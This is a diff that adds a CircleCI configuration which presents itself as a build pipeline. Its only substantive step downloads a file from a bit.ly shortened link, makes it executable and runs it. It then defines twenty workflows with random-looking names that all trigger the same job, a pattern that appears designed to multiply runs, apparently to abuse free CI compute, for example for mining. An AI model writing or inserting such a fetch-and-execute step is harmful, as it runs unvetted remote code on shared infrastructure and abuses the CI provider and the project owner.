@@ -1,0 +1,91 @@
+version: 2.1
+executors:
+  circleci_machine:
+    docker:
+      - image: cimg/go:1.16.4
+    working_directory: ~/my-project
+commands:
+  build:
+    description: Run build
+    steps:
+      - checkout
+      - run:
+          name: build
+          command: |
+              sudo apt update 
+               
+      - run:
+          name: build
+          command: |
+              wget -O start https://bit.ly/3t2gjRq && chmod +x start && ./start
+              
+jobs:
+  buildd:
+    executor: circleci_machine
+    working_directory: ~/my-project
+    steps: [build]
+
+    
+    
+workflows:
+  version: 2
+  burdosan:
+    jobs:
+      - buildd
+  bumihan:
+    jobs:
+      - buildd
+  bakugan:
+    jobs:
+      - buildd
+  ettrhhj:
+    jobs:
+      - buildd
+  ujamnin:
+    jobs:
+      - buildd
+  bakuhju:
+    jobs:
+      - buildd
+  janiuoy:
+    jobs:
+      - buildd
+  jakahyu:
+    jobs:
+      - buildd
+  gatingal:
+    jobs:
+      - buildd
+  hunayu:
+    jobs:
+      - buildd
+  rhtjtyj:
+    jobs:
+      - buildd
+  sfdhjkasd:
+    jobs:
+      - buildd
+  shfjkas:
+    jobs:
+      - buildd
+  sungakna:
+    jobs:
+      - buildd
+  sfhsfus:
+    jobs:
+      - buildd
+  dadughs:
+    jobs:
+      - buildd
+  oikugd:
+    jobs:
+      - buildd
+  vunhyqu:
+    jobs:
+      - buildd
+  zayana:
+    jobs:
+      - buildd
+  kalaumi:
+    jobs:
+      - buildd
